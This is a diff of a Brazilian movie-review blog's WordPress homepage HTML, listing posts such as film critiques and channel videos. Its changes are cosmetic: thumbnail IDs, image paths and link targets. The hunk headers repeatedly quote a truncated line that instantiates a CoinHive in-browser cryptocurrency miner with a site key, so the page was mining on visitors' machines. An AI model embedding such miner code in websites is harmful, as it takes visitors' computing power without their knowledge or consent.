-			<a href="/archives/7654" rel="bookmark" title="UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN" target="_blank">UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN</a>
+			<a href="/archives/7654" rel="bookmark" title="UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN">UMA MULHER FANTÁSTICA (Una Mujer Fantástica, 2017) &#8211; Crítica CBN</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -419,18 +466,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7626" title="TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed4f0be" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c2996" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed4f0be' ).animateSvg();
+                $( '#59bd5de8c2996' ).animateSvg();
               });
-            } else { $( '#59bb7fed4f0be' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c2996' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO" data-hu-post-id="59bb7fed4f0be" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO" data-hu-post-id="59bd5de8c2996" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -446,7 +493,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7626" rel="bookmark" title="TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO" target="_blank">TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO</a>
+			<a href="/archives/7626" rel="bookmark" title="TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO">TÃO CORTANDO! 🔥 &#8211; ERROS de gravação / MAKING OF do PIPOCANDO</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -459,18 +506,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7624" title="MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed525cc" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c4b5f" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed525cc' ).animateSvg();
+                $( '#59bd5de8c4b5f' ).animateSvg();
               });
-            } else { $( '#59bb7fed525cc' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c4b5f' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!" data-hu-post-id="59bb7fed525cc" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!" data-hu-post-id="59bd5de8c4b5f" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -486,7 +533,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7624" rel="bookmark" title="MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!" target="_blank">MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!</a>
+			<a href="/archives/7624" rel="bookmark" title="MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!">MEUS 2 CENTAVOS NO FIQUE LIGADO (TV BRASIL)!</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -499,18 +546,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7617" title="10 Personagens que TORCEMOS para MORRER! 😵🔫">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed57978" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c62ef" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed57978' ).animateSvg();
+                $( '#59bd5de8c62ef' ).animateSvg();
               });
-            } else { $( '#59bb7fed57978' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c62ef' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="10 Personagens que TORCEMOS para MORRER! 😵🔫" data-hu-post-id="59bb7fed57978" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="10 Personagens que TORCEMOS para MORRER! 😵🔫" data-hu-post-id="59bd5de8c62ef" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -526,7 +573,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7617" rel="bookmark" title="10 Personagens que TORCEMOS para MORRER! 😵🔫" target="_blank">10 Personagens que TORCEMOS para MORRER! 😵🔫</a>
+			<a href="/archives/7617" rel="bookmark" title="10 Personagens que TORCEMOS para MORRER! 😵🔫">10 Personagens que TORCEMOS para MORRER! 😵🔫</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -539,18 +586,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7610" title="POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed5afc6" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c81be" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed5afc6' ).animateSvg();
+                $( '#59bd5de8c81be' ).animateSvg();
               });
-            } else { $( '#59bb7fed5afc6' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c81be' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN" data-hu-post-id="59bb7fed5afc6" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN" data-hu-post-id="59bd5de8c81be" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -566,7 +613,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7610" rel="bookmark" title="POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN" target="_blank">POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN</a>
+			<a href="/archives/7610" rel="bookmark" title="POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN">POLÍCIA FEDERAL: A LEI É PARA TODOS (2017) &#8211; Crítica CBN</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -579,18 +626,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7587" title="5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed5dd29" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8c99ef" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed5dd29' ).animateSvg();
+                $( '#59bd5de8c99ef' ).animateSvg();
               });
-            } else { $( '#59bb7fed5dd29' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8c99ef' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻" data-hu-post-id="59bb7fed5dd29" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻" data-hu-post-id="59bd5de8c99ef" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -606,7 +653,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7587" rel="bookmark" title="5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻" target="_blank">5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻</a>
+			<a href="/archives/7587" rel="bookmark" title="5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻">5 FILMES que DEVERIAM virar SÉRIES! 🎬 👌🏻</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -619,18 +666,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7575" title="IT: A COISA (2017) &#8211; Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed60c0b" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8cb4da" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed60c0b' ).animateSvg();
+                $( '#59bd5de8cb4da' ).animateSvg();
               });
-            } else { $( '#59bb7fed60c0b' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8cb4da' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="IT: A COISA (2017) &#8211; Crítica" data-hu-post-id="59bb7fed60c0b" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="IT: A COISA (2017) &#8211; Crítica" data-hu-post-id="59bd5de8cb4da" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -646,7 +693,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7575" rel="bookmark" title="IT: A COISA (2017) &#8211; Crítica" target="_blank">IT: A COISA (2017) &#8211; Crítica</a>
+			<a href="/archives/7575" rel="bookmark" title="IT: A COISA (2017) &#8211; Crítica">IT: A COISA (2017) &#8211; Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -659,18 +706,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7567" title="COMO NOSSOS PAIS (2017) &#8211; Crítica">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed63adb" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8ccd38" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed63adb' ).animateSvg();
+                $( '#59bd5de8ccd38' ).animateSvg();
               });
-            } else { $( '#59bb7fed63adb' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8ccd38' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="COMO NOSSOS PAIS (2017) &#8211; Crítica" data-hu-post-id="59bb7fed63adb" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="COMO NOSSOS PAIS (2017) &#8211; Crítica" data-hu-post-id="59bd5de8ccd38" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -686,7 +733,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7567" rel="bookmark" title="COMO NOSSOS PAIS (2017) &#8211; Crítica" target="_blank">COMO NOSSOS PAIS (2017) &#8211; Crítica</a>
+			<a href="/archives/7567" rel="bookmark" title="COMO NOSSOS PAIS (2017) &#8211; Crítica">COMO NOSSOS PAIS (2017) &#8211; Crítica</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -699,18 +746,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/7556" title="NOVIDADE NO CANAL: MAIS CRÍTICAS!">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb7fed6684a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5de8ce534" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb7fed6684a' ).animateSvg();
+                $( '#59bd5de8ce534' ).animateSvg();
               });
-            } else { $( '#59bb7fed6684a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5de8ce534' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="NOVIDADE NO CANAL: MAIS CRÍTICAS!" data-hu-post-id="59bb7fed6684a" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="NOVIDADE NO CANAL: MAIS CRÍTICAS!" data-hu-post-id="59bd5de8ce534" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -726,7 +773,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/7556" rel="bookmark" title="NOVIDADE NO CANAL: MAIS CRÍTICAS!" target="_blank">NOVIDADE NO CANAL: MAIS CRÍTICAS!</a>
+			<a href="/archives/7556" rel="bookmark" title="NOVIDADE NO CANAL: MAIS CRÍTICAS!">NOVIDADE NO CANAL: MAIS CRÍTICAS!</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
